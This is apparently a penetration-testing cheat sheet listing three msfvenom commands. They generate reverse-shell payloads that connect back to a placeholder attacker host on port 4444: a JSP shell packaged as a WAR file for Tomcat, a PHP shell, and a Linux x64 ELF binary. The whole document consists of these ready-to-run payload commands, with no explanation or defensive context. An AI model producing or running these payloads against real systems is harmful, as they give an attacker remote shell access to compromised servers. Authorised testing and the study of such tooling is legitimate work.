# msfvenom (Payload Generator)

## WAR (Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
```

## PHP
```bash
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=4444 -f raw -o shell.php
```

## ELF (Linux binary)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o shell.elf
```
